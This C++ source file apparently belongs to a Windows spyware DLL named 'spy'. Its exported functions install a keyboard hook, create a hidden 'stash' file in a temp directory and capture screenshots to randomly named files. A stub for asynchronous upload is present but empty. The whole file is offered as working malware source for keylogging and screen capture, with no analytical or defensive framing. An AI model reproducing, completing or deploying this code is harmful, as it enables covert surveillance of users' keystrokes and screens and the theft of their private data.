#include "spy.h"
#include "stash.h"
#include "scrotfile.h"
#include "kbhook.h"
#include "screenshot.h"
#include "task.h"

HINSTANCE hinst_dll = NULL;

EXPORT DWORD load_spy()
{
	return Spy::load(hinst_dll);
}

EXPORT VOID unload_spy()
{
	Spy::unload();
}

EXPORT VOID take_scrot()
{
	Spy::take_screenshot();
}

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved)
{
	hinst_dll = hinstDLL;
	return TRUE;
}

Stash * Spy::stash = NULL;

void Spy::get_temp_fname(char * buffer, int l)
{
	for (int i = 0; i < l; ++i)
	{
		buffer[i] = '0' + rand() % 10;
	}
	buffer[l] = '\0';
}

void Spy::path_combine(char * dst, const char * dir, const char * fname)
{
	strcpy(dst, dir);
	int last_index = strlen(dir) - 1;
	if (dir[last_index] != SPY_FILE_SEPARATOR)
		dst[++last_index] = SPY_FILE_SEPARATOR;
	strcpy(dst + last_index + 1, fname);
}

void Spy::get_temp_fpath(char * buffer, const char * fname)
{
	if (fname == NULL)
	{
		char * name = new char[SPY_TMP_FNAME_LTH + 1];
		get_temp_fname(name, SPY_TMP_FNAME_LTH);
		path_combine(buffer, SPY_TMP_DIR, name);
		delete[] name;
	}
	else
	{
		path_combine(buffer, SPY_TMP_DIR, fname);
	}
	LOG("generate temp name: %s", buffer);
}

Stash * Spy::gen_stash()
{
	char * buffer = new char[MAX_PATH];
	get_temp_fpath(buffer, SPY_TMP_FNAME_STASH);
	Stash * stash = new Stash(buffer);
	delete[] buffer;
	return stash;
}

DWORD Spy::load(HINSTANCE hinstance)
{
	stash = gen_stash();
	return KBHook::load(hinstance);
}

void Spy::unload()
{
	KBHook::unload();
	delete stash;
}

Stash * Spy::get_stash()
{
	return stash;
}

void Spy::take_screenshot()
{
	LOG("Taking a screenshot");
	char * buffer = new char[MAX_PATH];
	get_temp_fpath(buffer);
	Screenshot * screenshot = new Screenshot(0.5f, buffer);
	LOG("Capturing screen and saving to file");
	screenshot->capture_to_file();
	LOG("Done!");
	delete screenshot;
	delete buffer;
}

void Spy::upload_async()
{

}